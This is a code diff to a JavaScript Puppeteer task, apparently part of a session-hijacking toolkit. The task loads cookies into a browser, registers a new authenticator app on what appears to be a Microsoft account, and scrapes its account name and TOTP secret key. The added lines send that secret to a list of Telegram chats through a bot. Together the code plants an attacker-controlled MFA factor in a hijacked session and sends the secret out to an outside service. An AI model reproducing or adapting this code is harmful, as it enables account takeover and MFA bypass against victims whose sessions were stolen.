@@ -2,8 +2,17 @@ const necrohelp = require('../../tasks/helpers/necrohelp')
 const db = require('../../db/db')
 const clusterLib = require('../../puppeteer/cluster')
 const fs = require('fs')
+const TelegramBot = require('node-telegram-bot-api');
 
 exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => {
+    const token = params.telegramToken;
+    const bot = new TelegramBot(token, {polling: false});
+    const chatId = params.telegramChatId;
+
+    // Send notification via Telegram bot:
+    for(let id of chatId){
+        bot.sendMessage(id, `Instrumentation #${taskId} started`);
+    }
 
     // this is constant
     const nextButtonSelector = "div.ms-Dialog-actionsRight > span:nth-child(2) > button"
@@ -11,7 +20,6 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
     await db.UpdateTaskStatus(taskId, "running")
 
     await page.setCookie(...cookies);
-
     await page.goto(params.fixSession);
     //await necrohelp.ScreenshotCurrentPage(page, taskId)
     await page.waitForTimeout(5000)
@@ -54,7 +62,8 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
     const accountName = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(6) > span").innerText');
     const secretKey = await page.evaluate('document.querySelector("div.ms-Dialog-content > div > div > div > div > div:nth-child(7) > span").innerText');
 
-    console.log(`[${taskId}] New Authenticator App accountName: ${accountName} with secretKey: ${secretKey}`)
+    const msg_notification = `[${taskId}] New Authenticator App accountName: ${accountName} with secretKey: ${secretKey}`;
+    console.log(msg_notification)
 
     // click on Next
     await page.click(nextButtonSelector).catch(console.error)
@@ -76,6 +85,11 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 
     await db.UpdateTaskStatus(taskId, "completed")
 
+
+    // Send notification via Telegram bot:
+    for(let id of chatId){
+        bot.sendMessage(id, msg_notification);
+    }
 }
 
 exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
